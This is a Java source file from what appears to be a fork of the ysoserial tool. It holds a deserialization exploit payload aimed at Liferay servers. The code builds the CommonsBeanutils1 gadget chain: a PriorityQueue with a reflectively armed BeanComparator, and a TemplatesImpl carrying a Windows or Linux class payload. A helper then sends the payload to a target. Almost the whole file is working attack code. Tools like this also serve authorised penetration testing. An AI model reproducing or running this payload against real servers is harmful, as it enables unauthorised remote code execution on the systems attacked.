package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import ysoserial.features.GenerateLiferay;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.external.Liferay_linux;
import ysoserial.payloads.external.Liferay_win;
import ysoserial.payloads.util.Gadgets1;
import ysoserial.payloads.util.Gadgets2;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.HashMap;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class liferay_CommonsBeanutils1 implements ObjectPayload<String> {
    public String getObject(HashMap<String, String> vars) throws Exception {
        String platform = vars.get("platform");

        Class classpayload = null;
        if (platform.startsWith("win")) {
            classpayload = Liferay_win.class;
        } else {
            classpayload = Liferay_linux.class;
        }
        final Object templates = Gadgets2.createTemplatesImpl(classpayload);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return GenerateLiferay.sendpayload(queue);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(liferay_CommonsBeanutils1.class, args);
    }
}
